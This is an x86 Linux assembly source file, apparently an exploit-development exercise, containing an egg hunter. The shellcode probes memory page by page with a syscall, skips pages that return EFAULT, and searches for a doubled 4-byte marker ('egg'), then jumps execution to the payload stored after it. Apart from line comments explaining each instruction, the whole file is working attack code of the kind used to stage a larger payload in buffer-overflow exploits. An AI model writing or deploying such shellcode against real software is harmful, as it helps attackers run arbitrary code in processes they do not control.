global _start
section .text
_start:
;Egg Hunter 

xor eax, eax 		;zero out the registers 
xor ebx, ebx
xor edx, edx
xor esi, esi
align_page:
    or cx,0xfff         ; set up page alignment which is by default 4096 
			; but we decrement it by 1 and increment it later 
next_address:
    inc ecx		; set the page to the default 4096
    push byte +0x43     ; move syscall ID to eax
    pop eax
    int 0x80            
    cmp al,0xf2         ; check if we get an EFAULT to check if memory
			; is valid or not 
    jz align_page       ; if invalid try the next page 
    mov eax, 0x50905090 ; mov our egg to eax 
    mov edi, ecx        ; save the address in edi 
    scasd               ; check if we match the first 4 and our egg

    jnz next_address    ; if they don't match we check the next address 
    scasd               ; if they match we check the other 4 bytes 

    jnz next_address    ; if they don't match we check the next address
    jmp edi       	; if they match then we found our egg :D 
